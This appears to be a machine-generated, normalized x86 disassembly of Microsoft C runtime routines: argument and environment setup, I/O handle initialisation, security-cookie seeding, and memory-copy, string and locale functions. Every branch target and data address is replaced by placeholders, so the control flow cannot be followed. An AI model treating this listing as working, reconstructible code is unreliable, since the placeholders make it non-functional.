cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_40a0f4
pop ecx
test eax eax
je r-xdata
call sub_40a0f4
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_406bb1
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_407ff9
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_406a17
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_4070db
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_406a17
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_406c6c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_4070db
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_404a59
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_406d03
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_407120
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_407120
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_406f48
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_406feb
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_405be1
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_405be1
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_40571b
mov eax esi
jmp r-xdata
sub_407050
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4070db
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_405060
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_407120
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4061ee
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40716c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a10c
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_4071ba
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
or eax 0xffffffff
pop ebp
retn
sub_4071f0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_407274 ]
jmp [ ecx * 4 + jump_table_4072f4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_407360 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_4074fc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_407400 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4074fc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_407360 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4074fc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_407360 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_407360 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_407360 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4074fc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4074fc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4074fc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_407551
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_404a59
pop ecx
sub_407580
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_40a2fc
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_4075fa
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_407689
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_407722
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_404a59
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_404a59
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_404a59
push [ esi + 0xc0 ]
call sub_404a59
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_40a3b6
push [ esi + 0xd4 ]
call sub_404a59
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_404a59
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404a59
pop ecx
push [ esi + 0xb0 ]
call sub_404a59
push [ esi + 0xbc ]
call sub_404a59
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404a59
push [ esi + 0xbc ]
call sub_40a796
pop ecx
pop ecx
push eax
call sub_404a59
pop ecx
push eax
call sub_404a59
push [ esi + 0xbc ]
call sub_40a72d
pop ecx
pop ecx
sub_40786d
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_4075fa
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_407689
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_407722
pop ecx
sub_4078ba
push 0xc
push r--data
call sub_405df0
call sub_4058db
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_4052f1
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_40786d
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407927
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_4058db
mov esi [ eax + 0x6c ]
mov eax esi
call sub_405e35
retn
push 0x20
call sub_4049f0
sub_407933
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_407962
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_407580
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_4079c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_40aba8
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_40aa7b
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_40aa7b
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_407580
add esp 0xc
